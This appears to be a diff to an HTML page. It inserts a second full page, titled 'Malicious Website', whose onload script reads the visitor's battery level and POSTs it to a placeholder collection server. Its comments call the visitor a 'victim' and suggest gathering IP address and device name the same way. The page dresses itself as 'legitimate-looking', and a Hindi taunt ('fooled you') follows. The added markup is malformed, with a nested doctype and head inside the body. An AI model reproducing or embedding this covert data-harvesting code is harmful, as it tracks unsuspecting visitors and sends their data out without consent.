@@ -92,6 +92,34 @@
     </script>
 </head>
 <body onload="displayDeviceInfo()">
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Website</title>
+    <script>
+        // Function to gather victim information and send it to your server
+        function gatherAndSendInformation() {
+            // Example: gather battery percentage
+            var batteryLevel = navigator.getBattery().then(function(battery) {
+                var batteryPercentage = battery.level * 100;
+                // Send battery percentage to your server using AJAX
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "http://yourserver.com/collect-information", true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.send(JSON.stringify({ batteryPercentage: batteryPercentage }));
+            });
+            
+            // Similar code can be used to gather other information like IP address, device name, etc.
+        }
+    </script>
+</head>
+<body onload="gatherAndSendInformation()">
+    <h1>Welcome to our Website!</h1>
+    <p>This is a legitimate-looking website.</p>
+</body>
+
     <header>
         <h1>Chutiya banaya tumhara</h1>
         <nav>
